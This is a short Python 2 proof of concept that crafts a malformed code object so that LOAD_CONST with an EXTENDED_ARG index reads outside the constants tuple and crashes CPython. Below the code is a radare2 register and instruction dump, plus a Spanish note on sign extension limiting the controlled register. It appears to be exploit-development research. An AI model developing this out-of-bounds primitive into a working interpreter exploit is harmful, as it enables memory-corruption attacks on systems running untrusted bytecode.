#!/usr/bin/env python
# -*- coding: utf-8 -*-

import opcode
import types

def a():
  pass

a.func_code = types.CodeType(
  0, 0, 0, 0,
  #chr(opcode.opmap['EXTENDED_ARG']) + '\xaa\xbb' +
  chr(opcode.opmap['EXTENDED_ARG']) + '\xef\xbe' +
  chr(opcode.opmap['LOAD_CONST'])   + '\xad\xde',
  (), (), (), '', '', 0, ''
)
a()

# r2 -d python crash.py

"""
 rax 0x559f1bcbe980       rbx 0xbeefdead           rcx 0x000000ef                                                                                     
 rdx 0xffffffffbeefdead    r8 0x0000dead            r9 0x7f1e71df25ca                                                                                 
 r10 0x000000ad           r11 0x7f1e71e17508       r12 0x559f1befa110                                                                                 
 r13 0x7f1e71e17390       r14 0x7f1e71ef6050       r15 0x00000064                                                                                     
 rsi 0x559f1bf6b5bc       rdi 0x559f1bdd05c0       rsp 0x7ffd9bec90e0                                                                                 
 rbp 0x7f1e71df25c4       rip 0x559f1bcbe988       rflags C1IV                                                                                        
orax 0xffffffffffffffff                                                                                                                               


       ╎╎   ;-- rip:                                                                                                                                  
       ╎╎   0x559f1bcbe988      4d8b64d618     mov r12, qword [r14 + rdx*8 + 0x18]    ; [0x18:8]=-1 ; 24


PROBLEMA:
rdx deberia ser 0xbeefdead pero es 0xffffffffbeefdead
solo controlo ebx
"""